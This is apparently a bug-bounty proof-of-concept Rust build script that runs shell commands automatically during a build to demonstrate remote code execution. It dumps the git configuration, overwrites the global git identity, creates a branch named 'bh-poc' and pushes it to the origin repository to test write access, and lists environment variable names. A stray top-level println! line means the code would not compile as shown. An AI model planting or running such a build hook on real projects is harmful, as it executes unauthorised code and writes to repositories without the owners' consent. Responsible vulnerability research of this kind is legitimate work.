use std::process::Command;

println!("cargo:rustc-env=FORCE_RUN=1");

fn main() {
    // Marker to prove RCE
    eprintln!("____RCE_Success");

    // Show git config (read-only)
    let _ = Command::new("sh")
        .arg("-c")
        .arg("git config --list >&2 || echo 'no git config' >&2")
        .status();

    eprintln!("____RCE_Success");

    // test write permissions
    let _ = Command::new("sh")
        .arg("-c")
        .arg("git config --global user.email \"bh@someemail.com\"; \
              git config --global user.name \"H1Tester\"; \
              git fetch origin >&2; \
              git checkout master/v2 >&2; \
              git pull origin master/v2 >&2; \
              git checkout -b bh-poc >&2; \
              git add . >&2; \
              git push -u origin bh-poc >&2")
        .status();

    // Show environment variable *names* (read-only)
    let _ = Command::new("sh")
        .arg("-c")
        .arg("printenv | cut -d= -f1 >&2")
        .status();

    eprintln!("---test permissions (SAFE PoC)---");
}
